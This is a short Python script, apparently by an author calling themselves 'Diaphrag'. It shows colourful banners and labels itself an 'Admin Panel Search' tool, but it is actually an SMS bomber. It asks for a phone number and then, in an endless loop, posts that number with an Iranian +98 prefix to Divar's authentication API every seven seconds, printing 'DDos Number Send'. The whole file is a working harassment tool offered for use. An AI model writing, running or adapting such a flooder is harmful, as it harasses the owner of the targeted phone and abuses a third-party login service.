import requests
import time
import os
from colorama import Fore

class color : 
    Red = '\033[91m'
    Green = '\033[92m'
    Blue = '\033[94m'
    Cyan = '\033[96m'
    White = '\033[97m'
    Yellow = '\033[93m'
    Magenta = '\033[95m'
    Grey = '\033[90m'
    Black = '\033[90m'
    Default = '\033[99m'
def clear_console():
    if os.name in ('nt', 'dos'): 
        try:
            os.system("cls")
        except:
            pass
    else:
        try:
            os.system("clear")
        except:
            pass
def change_title():
    if os.name in ('nt', 'dos'):
        try:
            os.system('title "Diaphrag [!] Admin Panel Search"')
        except:
            pass
    else:
            pass


clear_console()
change_title()



Diaphrag = color.Red+"""

                                            ____  _             _                     
                                           |  _ \(_) __ _ _ __ | |__  _ __ __ _  __ _ 
                                           | | | | |/ _` | '_ \| '_ \| '__/ _` |/ _` |
                                           | |_| | | (_| | |_) | | | | | | (_| | (_| |
                                           |____/|_|\__,_| .__/|_| |_|_|  \__,_|\__, |
                                                         |_|                    |___/ 
 

"""

banner =color.Green+ f"""
[!] Coded By Diaphrag

       '||''|.    ||                   '||                              
        ||   ||  ...   ....   ... ...   || ..   ... ..   ....     ... . 
        ||    ||  ||  '' .||   ||'  ||  ||' ||   ||' '' '' .||   || ||  
        ||    ||  ||  .|' ||   ||    |  ||  ||   ||     .|' ||    |''   
       .||...|'  .||. '|..'|'  ||...'  .||. ||. .||.    '|..'|'  '||||. 
                               ||                               .|....' 
                              ''''                                      

"""


def slowprint(text: str, speed: float, newLine=True):
    for i in text:
        print(i, end="", flush=True)
        time.sleep(speed)
    if newLine:
        print()

print(Diaphrag)
time.sleep(5)
clear_console()
print(banner)
time.sleep(1)
slowprint(color.Red+"\n\n                   [!] Coded By Diaphrag\n",0.07)
slowprint(color.Green+"                 [!] Search Admin Panel!\n",0.07)



Enter = input(color.Green+"send your number-->  :  ")

while True:
    url = "https://api.divar.ir/v5/auth/authenticate"
    number = {"phone":"+98"+Enter}
    sms = requests.post(url,data=number)
    print(color.Red+"  +-+-+-+-+-++-+-+-+-+-+-+-+-+- [+] DDos Number Send [+] +-+-+-+-+-++--+-+-+-+-+-+-")
    time.sleep(7)
